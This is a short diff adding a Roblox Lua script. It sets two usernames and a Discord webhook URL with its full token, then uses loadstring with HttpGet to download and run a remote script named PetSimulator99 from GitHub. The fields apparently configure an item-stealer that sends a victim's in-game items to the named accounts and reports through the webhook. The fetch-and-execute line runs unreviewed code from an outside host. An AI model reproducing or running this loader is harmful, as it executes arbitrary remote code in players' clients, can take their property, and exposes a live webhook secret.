@@ -1,0 +1,5 @@
+Username = "Furiousbeast128"
+Username2 = "wrizz12388"
+Webhook = "https://discord.com/api/webhooks/1312312849162305556/VXvPsf-JYt9_QXgxFr_wEV3ZUGZechb3rP1fZlXCUEhsHf7oXFqG9XqJTBgwyO77e9Dd"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ankaikazc/Red/main/PetSimulator99"))()
